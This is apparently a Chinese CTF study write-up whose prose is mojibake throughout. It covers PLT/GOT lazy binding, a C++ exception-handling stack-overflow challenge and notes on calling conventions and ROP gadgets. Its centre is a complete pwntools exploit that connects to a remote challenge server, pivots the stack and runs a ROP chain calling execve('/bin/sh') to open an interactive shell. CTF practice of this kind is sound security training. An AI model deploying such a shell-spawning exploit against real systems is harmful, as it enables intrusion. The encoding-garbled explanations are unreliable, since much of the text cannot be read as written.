**è¿™å°±å¼•å…¥äº†PLTè¡¨ï¼ŒPLTè¡¨æ¯ä¸ªå‡½æ•°çš„ç¬¬ä¸€é¡¹éƒ½æ˜¯ä¸€ä¸ªjmpè‡³GOTè¡¨çš„æ“ä½œï¼ŒGOTè¡¨åœ¨å‡½æ•°è¢«è°ƒç”¨ä¹‹å‰å¹¶ä¸å­˜æ”¾å‡½æ•°çœŸå®åœ°å€ï¼Œè€Œæ˜¯PLTè¡¨writeå‡½æ•°å¯¹åº”è¡¨é¡¹ä¸­push 0x20æŒ‡ä»¤çš„ä½ç½®ï¼Œç„¶åå†è·³ä¸€æ¬¡ï¼Œå‹ä¸€ä¸ªå‚æ•°ï¼Œå†è·³ï¼Œä¾¿æ˜¯_dl_runtime_resolve(link_map, reloc_arg)å‡½æ•°ï¼Œä¹‹å‰çš„ä¸¤ä¸ªå‚æ•°å°±æä¾›ç»™è¿™ä¸ªå‡½æ•°**

*.rel.pltè¡¨ï¼šELFï¼ˆExecutable and Linkable Formatï¼‰æ–‡ä»¶æ ¼å¼ä¸­çš„ä¸€ä¸ªé‡å®šä½è¡¨ï¼Œç”¨äºæ”¯æŒå»¶è¿Ÿç»‘å®šï¼ˆLazy Bindingï¼‰åŠŸèƒ½ã€‚å®ƒä¸»è¦ç”¨äºåŠ¨æ€é“¾æ¥åº“ï¼ˆå¦‚ .so æ–‡ä»¶ï¼‰è°ƒç”¨çš„ç¬¦å·é‡å®šä½ã€‚*
*.rel.plt è¡¨ä¿å­˜äº†ç¨‹åºè¿è¡Œæ—¶éœ€è¦é‡å®šä½çš„å‡½æ•°å…¥å£çš„ä¿¡æ¯ï¼Œé€šå¸¸åŒ…å«äº†ç›®æ ‡å‡½æ•°çš„ç¬¦å·åœ°å€å’Œä¸€äº›é‡å®šä½ä¿¡æ¯ã€‚è¿™äº›é‡å®šä½ä¿¡æ¯å…è®¸ç¨‹åºåœ¨é¦–æ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°æ—¶ï¼ŒåŠ¨æ€åœ°ä»å…±äº«åº“ä¸­åŠ è½½å‡½æ•°çš„çœŸå®åœ°å€ï¼Œå¹¶å¡«å……åˆ° .pltï¼ˆProcedure Linkage Tableï¼‰ä¸­ï¼Œä½¿åç»­çš„è°ƒç”¨å¯ä»¥ç›´æ¥è·³è½¬åˆ°è¯¥åœ°å€ï¼Œé¿å…é‡å¤çš„é‡å®šä½æ“ä½œã€‚*

**ä¸Šæ–‡çš„0x20ä¾¿æ˜¯æä¾›ç»™.rel.pltè¡¨çš„åç§»ï¼Œè¿™ä¸ªåœ°æ–¹æ˜¯relocçš„ä½ç½®**

***ç®—äº†ä»¥åå†å­¦pwn***

## 5. RISC-V:
> è¿™æ˜¯ä¸ªæ±‡ç¼–ç¼–ç¨‹é¢˜


## 6. é›¶è§£é¢˜
> é™æ€ç¼–è¯‘ï¼Œä¸å­˜åœ¨PIEä¿æŠ¤ï¼ˆPosition Independent Executableï¼‰
> ç¬¬ä¸€é¢˜æ˜¯æ¯”è¾ƒä¼ ç»Ÿçš„æ ˆæº¢å‡ºï¼Œåˆ©ç”¨æ ˆæº¢å‡ºç ´åthrowçš„è¿”å›åœ°å€ï¼Œå¼•å¯¼å»tryå—
*çŸ¥è¯†ç‚¹ï¼šC++å¼‚å¸¸æœºåˆ¶*
**å½“ç¨‹åºæ‰§è¡Œåˆ°throwè¯­å¥æ—¶ï¼Œä¼šå¼€å§‹å¼‚å¸¸å¤„ç†æµç¨‹**
**å¼‚å¸¸å¤„ç†æœºåˆ¶ä¼šæ²¿ç€è°ƒç”¨æ ˆå‘ä¸ŠæŸ¥æ‰¾ï¼Œå¯»æ‰¾åŒ¹é…çš„catchå—**
**ä¸€æ—¦æ‰¾åˆ°åŒ¹é…çš„catchå—ï¼Œç¨‹åºä¼šè·³åˆ°è¯¥å—ï¼Œæ‰§è¡Œå…¶ä¸­çš„ä»£ç **

*å¦‚ä½•å®šä½catchå—*
**ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶äº§ç”Ÿå¼‚å¸¸å¤„ç†è¡¨ï¼ŒåŒ…å«æ¯ä¸ªå¯èƒ½æŠ›å‡ºå¼‚å¸¸çš„ä»£ç æ®µå¯¹åº”çš„try-catchå—**
**å¼‚å¸¸æŠ›å‡ºä¹‹åï¼Œçœ‹å½“å‰æŒ‡ä»¤åœ°å€æ˜¯å¦æœ‰å¯¹åº”çš„catchå—ï¼Œæ²¡æœ‰å°±å‘å‰ä¸€ä¸ªæ ˆå¸§æŸ¥æ‰¾**

> æ‰€ä»¥vulnå¯ä»¥ç›´æ¥æŠŠå¼‚å¸¸æŠ›å‡ºç»™bannerçš„catchå—

é¢˜è§£ï¼š

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   ä½œè€…ï¼š@eastXueLian

from pwn import *

# è®¾ç½®æ—¥å¿—ç­‰çº§å’Œæ¶æ„
context.log_level = "info"
context.arch = "amd64"

# è¿æ¥åˆ°è¿œç¨‹æœåŠ¡
io = remote("202.38.93.141", 31335)

# è¾…åŠ©å‡½æ•°
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))  # å°†æ•°æ®è½¬æ¢ä¸º64ä½æ— ç¬¦å·æ•´æ•°
i2b = lambda c: str(c).encode()  # å°†æ•´æ•°è½¬æ¢ä¸ºå­—èŠ‚ä¸²

# æ¥æ”¶æç¤ºå¹¶å‘é€ä»¤ç‰Œ
io.recvuntil(b":")
io.sendline(input("è¯·è¾“å…¥ä½ çš„ä»¤ç‰Œï¼š").encode())  # æç¤ºç”¨æˆ·è¾“å…¥ä»¤ç‰Œå¹¶å‘é€

# å®šä¹‰å‘é€æœ‰æ•ˆè´Ÿè½½çš„å‡½æ•°
def send_payload(payload):
    # å°†æœ‰æ•ˆè´Ÿè½½æ‹†åˆ†ä¸º8å­—èŠ‚ä¸€ç»„çš„æ•´æ•°åˆ—è¡¨
    payload_list = [0 for _ in range(len(payload) // 8 + 1)]#åˆ›å»ºä¸€ä¸ªé•¿åº¦ä¸º len(payload) // 8 + 1 çš„åˆ—è¡¨ï¼Œåˆ—è¡¨ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ 0
    for i in range(0, len(payload), 8):
        payload_list[i // 8] = u64_ex(payload[i:i+8])
    data = b""
    # å°†æ¯ä¸ªæ•´æ•°è½¬æ¢ä¸ºå­—èŠ‚ä¸²å¹¶ç”¨ç©ºæ ¼åˆ†éš”
    for i in payload_list:
        data += i2b(i)
        data += b" "
    # å‘é€æ•°æ®ï¼Œæœ«å°¾æ·»åŠ ç‰¹æ®Šå€¼0x31337å¹¶æ¢è¡Œ
    io.send(data + i2b(0x31337) + b"\n")
    # æ¥æ”¶ç›´åˆ°æç¤ºä¸‹ä¸€è½®å¼€å§‹
    io.recvuntil(b"next round has begun.\n")

# ç­‰å¾…åˆå§‹æç¤º
io.recvuntil(b"stop reading until I receive the correct one.")
# å‘é€åˆå§‹æœ‰æ•ˆè´Ÿè½½ï¼Œç”¨äºå¯¹é½æˆ–è®¾ç½®ç¯å¢ƒ
send_payload(b"a")

# å®šä¹‰ä¸€äº›å…³é”®åœ°å€å’Œå€¼
try_addr = 0x0000000000401F0E      
# 'banner'å‡½æ•°çš„tryå—åœ°å€
new_stack = 0x31337000             
# æ–°çš„æ ˆåœ°å€ï¼Œç”¨äºæ ˆè¿ç§»(æºä»£ç ä¸­æä¾›äº†ä¸€ä¸ªæ ˆåœ°å€åŒºé—´ï¼Œè¿™é‡Œå–äº†èŒƒå›´ä¹‹å†…çš„ä¸€ä¸ªåœ°å€)ï¼šè¦†ç›–rbpï¼Œä½¿å¾—å‡½æ•°è¿”å›æ—¶ï¼Œrspè¢«è®¾ç½®ä¸ºnew_stackï¼Œå®ç°æ ˆè¿ç§»
pop_rdi_ret = 0x0000000000402F7C   # ROPå°å·¥å…·ï¼špop rdi; ret
pop_rsi_ret = 0x0000000000404669   # ROPå°å·¥å…·ï¼špop rsi; ret
pop_rdx_2_ret = 0x00000000004AF0DB # ROPå°å·¥å…·ï¼špop rdx; pop rbx; ret
pop_rax_ret = 0x0000000000463DA7   # ROPå°å·¥å…·ï¼špop rax; ret
syscall_ret = 0x42EA86             # ROPå°å·¥å…·ï¼šsyscall; ret

# æ„é€ ç¬¬ä¸€ä¸ªæœ‰æ•ˆè´Ÿè½½ï¼Œå®ç°æ ˆè¿ç§»
payload = flat(                 #flat() å‡½æ•°ï¼špwntools åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†åµŒå¥—çš„æ•°æ®ç»“æ„ï¼ˆå¦‚åˆ—è¡¨ã€å­—å…¸ï¼‰æ‰å¹³åŒ–ä¸ºå­—èŠ‚ä¸²ï¼Œè‡ªåŠ¨å¤„ç†æ•°æ®çš„ç«¯åºå’Œå¡«å……
    {
        0x00: [0x1111, 0x2222, 0x3333, 0x4444, new_stack],  # è¦†ç›–ä¿å­˜çš„RBPä¸ºnew_stack
        0x28: [try_addr + 1, 0xDEADBEEF, 0xCAFECAFE, 0x31337],  # è¦†ç›–è¿”å›åœ°å€ç­‰
    }
)
# å‘é€ç¬¬ä¸€ä¸ªæœ‰æ•ˆè´Ÿè½½
send_payload(payload)

# æ„é€ ç¬¬äºŒä¸ªæœ‰æ•ˆè´Ÿè½½ï¼ŒåŒ…å«ROPé“¾
payload = flat(
    {
        0x00: [u64_ex(b"/bin/sh\x00"), 0x2222, 0x3333, 0x4444, new_stack + 0x10],  # å‡†å¤‡æ•°æ®å¹¶è°ƒæ•´RBP
        0x28: [
            try_addr + 1,        # å†æ¬¡è¦†ç›–è¿”å›åœ°å€åˆ°'banner'å‡½æ•°çš„tryå—
            0x4DE4B0,            # å ä½ç¬¦æˆ–ç‰¹å®šåœ°å€ï¼ˆå¯èƒ½ç”¨äºå¯¹é½ï¼‰
            pop_rdi_ret,         # è®¾ç½®RDIå¯„å­˜å™¨
            0x31336FE0,          # æŒ‡å‘"/bin/sh\x00"å­—ç¬¦ä¸²çš„åœ°å€
            pop_rsi_ret,         # è®¾ç½®RSIå¯„å­˜å™¨
            0,                   # RSIè®¾ä¸º0ï¼ˆNULLï¼‰
            pop_rdx_2_ret,       # è®¾ç½®RDXå’Œå¦ä¸€ä¸ªå¯„å­˜å™¨
            0x31337010,          # RDXçš„å€¼ï¼ˆå¯èƒ½ä¸ºNULLæˆ–ç‰¹å®šå€¼ï¼‰
            0,                   # ç¬¬äºŒä¸ªå¼¹å‡ºçš„å¯„å­˜å™¨å€¼ï¼ˆå¦‚RBXï¼‰
            pop_rax_ret,         # è®¾ç½®RAXå¯„å­˜å™¨
            0x3B,                # ç³»ç»Ÿè°ƒç”¨å·59ï¼Œè¡¨ç¤ºexecve
            syscall_ret,         # è§¦å‘ç³»ç»Ÿè°ƒç”¨
        ],
    }
)
# å‘é€ç¬¬äºŒä¸ªæœ‰æ•ˆè´Ÿè½½
send_payload(payload)

# è¿›å…¥äº¤äº’æ¨¡å¼ï¼Œä¸shelläº¤äº’
io.interactive()

```

### é›¶è§£é¢˜2
> è¿™ä¸ªé¢˜ä½¿ç”¨äº†Intel CETæä¾›çš„å½±å­æ ˆä¿æŠ¤




### æ€»ç»“
> å…¥æ ˆé¡ºåºï¼š
1. Windows x64 Calling Convention
   - å‰å››ä¸ªæ•´å‹å‚æ•°åˆ†åˆ«æ˜¯rcx, rdx, r8, r9ä¼ é€’
   - å‰å››ä¸ªæµ®ç‚¹å‚æ•°åˆ†åˆ«æ˜¯xmm0, xmm1, xmm2, xmm3ä¼ é€’
   - å…¶ä»–å‚æ•°é€šè¿‡æ ˆä¼ é€’ï¼Œä»å³å¾€å·¦ä¾æ¬¡å…¥æ ˆ
   - è¿”å›å€¼é€šè¿‡raxè¿”å›

2. System V x64 Calling Conventionï¼ˆLinux/macOSï¼‰
   - å‰å…­ä¸ªæ•´å‹å‚æ•°åˆ†åˆ«æ˜¯rdi, rsi, rdx, rcx, r8, r9ä¼ é€’
   - å‰å…«ä¸ªæµ®ç‚¹å‚æ•°åˆ†åˆ«æ˜¯xmm0, xmm1, xmm2, xmm3, xmm4, xmm5, xmm6, xmm7ä¼ é€’
   - è¶…è¿‡å…­ä¸ªå‚æ•°çš„å…¶ä»–å‚æ•°é€šè¿‡æ ˆä¼ é€’ï¼Œä»å³å¾€å·¦ä¾æ¬¡å…¥æ ˆ
   - è¿”å›å€¼é€šè¿‡raxè¿”å›æˆ–è€…rdx:raxè¿”å›ï¼ˆç”¨äºè¿”å›ä¸¤ä¸ªæ•´æ•°å€¼çš„æƒ…å†µï¼‰

3. x86ï¼ˆ32ä½ï¼‰
   - æ‰€æœ‰å‚æ•°é€šè¿‡æ ˆä¼ é€’ï¼Œä»å³å¾€å·¦ä¾æ¬¡å…¥æ ˆ

>ROPå°å·¥å…·ï¼ˆGadgetï¼‰ï¼š
- ç¨‹åºæˆ–å…¶ä¾èµ–åº“ä¸­å·²å­˜åœ¨çš„çŸ­ä»£ç ç‰‡æ®µï¼Œé€šå¸¸ä»¥retæŒ‡ä»¤ç»“å°¾ï¼Œå¯ä»¥ç”¨æ¥æ„é€ ROPé“¾
- å¸¸è§çš„ROPå°å·¥å…·ï¼š
  - pop rdi; retï¼šå°†æ ˆé¡¶æ•°æ®å¼¹å‡ºåˆ°rdiå¯„å­˜å™¨
  - pop rsi; retï¼šå°†æ ˆé¡¶æ•°æ®å¼¹å‡ºåˆ°rsiå¯„å­˜å™¨
**c3== ret**
**5d== pop rbp**
**5e== pop rsi**

> åˆ—è¡¨æ¨å¯¼å¼åˆ›å»ºä¸€ä¸ªåˆ—è¡¨
**[è¡¨è¾¾å¼ for å˜é‡ in å¯è¿­ä»£å¯¹è±¡]**

> Payload:æœ‰æ•ˆè´Ÿè½½ï¼Œé€šå¸¸æŒ‡çš„æ˜¯å‘é€åˆ°ç›®æ ‡ç³»ç»Ÿçš„æ•°æ®

> lambdaè¡¨è¾¾å¼è¯­æ³•ï¼šäº§ç”Ÿä¸¤ä¸ªè¾…åŠ©å‡½æ•°å˜æ¢æ•°æ®å½¢å¼
**u64_ex = lambda data: u64(data.ljust(8, b"\x00"))**
**i2b = lambda c: str(c).encode()**

> å­—èŠ‚ä¸²å’Œå­—ç¬¦ä¸²å¯ä»¥ç›¸äº’è½¬åŒ–
**str.encode()ï¼šå­—ç¬¦ä¸²è½¬å­—èŠ‚ä¸²**
**bytes.decode()ï¼šå­—èŠ‚ä¸²è½¬å­—ç¬¦ä¸²**